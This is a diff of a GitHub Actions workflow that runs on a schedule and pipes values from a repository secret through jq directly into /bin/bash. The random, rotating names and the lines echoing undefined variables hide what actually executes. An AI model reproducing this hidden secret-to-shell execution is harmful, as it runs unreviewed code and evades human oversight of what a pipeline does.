@@ -1,21 +1,28 @@
 name: chengengfuzi
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 5/6 * * *'
+    - cron: '53 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chengengfuzi
         env:
-          bkbfr0: ${{ secrets.bkbfr0 }}
+          pnnpo3: ${{ secrets.pnnpo3 }}
         run: |
-          echo $bkbfr0 | jq -r .cowb0957 | /bin/bash
-          echo $ppc49213 | jq -r .pysl508 | /bin/bash
-          echo $cimt34509 | jq -r .s01179 | /bin/bash
-          echo $vvrug54296 | jq -r .zst01761 | /bin/bash
+          echo $pnnpo3 | jq -r .kdqt0053 | /bin/bash
+          echo $y47796 | jq -r .u8 | /bin/bash
+          echo $lf83518 | jq -r .wd3 | /bin/bash
+          echo $t07 | jq -r .rs31 | /bin/bash
+          echo $c36 | jq -r .ob967 | /bin/bash
+          echo $au57 | jq -r .gtmek3411 | /bin/bash
+          echo $t95439 | jq -r .ws6 | /bin/bash
+          echo $zdfi6092 | jq -r .emz995 | /bin/bash
+          echo $gn37 | jq -r .mrzg47751 | /bin/bash
+          echo $liy0181 | jq -r .vl199 | /bin/bash
+          echo $vq36 | jq -r .x86 | /bin/bash
+          echo $c817 | jq -r .y9 | /bin/bash
 
